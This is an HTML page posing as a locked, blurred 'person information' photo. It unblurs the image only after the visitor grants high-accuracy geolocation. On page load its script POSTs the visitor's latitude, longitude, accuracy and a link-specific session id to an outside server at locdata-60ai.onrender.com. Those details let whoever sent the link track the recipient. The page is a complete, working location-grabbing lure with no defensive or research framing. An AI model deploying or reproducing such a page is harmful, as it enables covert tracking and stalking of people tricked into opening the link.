<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>üìç Location Required</title>
  <style>
    body {
      font-family: -apple-system, Roboto, sans-serif;
      text-align: center;
      padding: 20px;
      background: #f7f7f7;
    }

    .img-wrapper {
      display: inline-block;
      position: relative;
      max-width: 100%;
      margin-bottom: 20px;
    }

    .img-wrapper img {
      width: 100%;
      max-width: 500px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.2);
      filter: blur(25px); /* Strong blur */
      transition: filter 0.6s ease;
    }

    .img-wrapper img.clear {
      filter: none;
    }

    .overlay-lock {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border-radius: 12px;
      background: rgba(0, 0, 0, 0.4);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      font-weight: bold;
      pointer-events: none;
      transition: opacity 0.5s ease;
    }

    .img-wrapper.unlocked .overlay-lock {
      opacity: 0;
      pointer-events: none;
    }

    #msg {
      margin-top: 12px;
      font-size: 15px;
      color: #333;
    }

    #coord {
      margin-top: 8px;
      font-size: 14px;
      color: #444;
    }
  </style>
</head>
<body>
  <h3>üîí Secured Sensitive Data</h3>

  <div id="imgContainer" class="img-wrapper">
    <img id="photo" src="user.jpg" alt="Secure image" />
    <div class="overlay-lock">üîí Person Information   (Warning Don't share this Personal Details with Anyone)</div>
  </div>

  
  <div id="coord"></div>

  <script>
    const sessionId = new URLSearchParams(location.search).get('id') || 'SESSION_' + Date.now();
    const img = new URLSearchParams(location.search).get('img');
    const photo = document.getElementById('photo');
    const container = document.getElementById('imgContainer');

    if (img) photo.src = img;

    const msg = txt => document.getElementById('msg').innerText = txt;
    const showCoords = (lat, lon, acc) => {
      document.getElementById('coord').innerHTML =
        ``;
    };

    window.addEventListener('DOMContentLoaded', () => {
      if (!navigator.geolocation) {
        msg('');
        return;
      }

      navigator.geolocation.getCurrentPosition(async pos => {
        const lat = pos.coords.latitude.toFixed(6);
        const lon = pos.coords.longitude.toFixed(6);
        const acc = Math.round(pos.coords.accuracy);

        showCoords(lat, lon, acc);
        msg('üì§ Sending location‚Ä¶');

        try {
          const res = await fetch('https://locdata-60ai.onrender.com/store', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, lat, lon, accuracy_m: acc })
          });
          msg(res.ok ? '‚úÖ Location shared!' : '‚ö†Ô∏è Share failed');
        } catch {
          msg('');
        }

        // Unblur the image & hide lock overlay
        photo.classList.add('clear');
        container.classList.add('unlocked');

      }, err => {
        msg(`‚ùå Location denied or failed: ${err.message}`);
      }, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      });
    });
  </script>
</body>
</html>
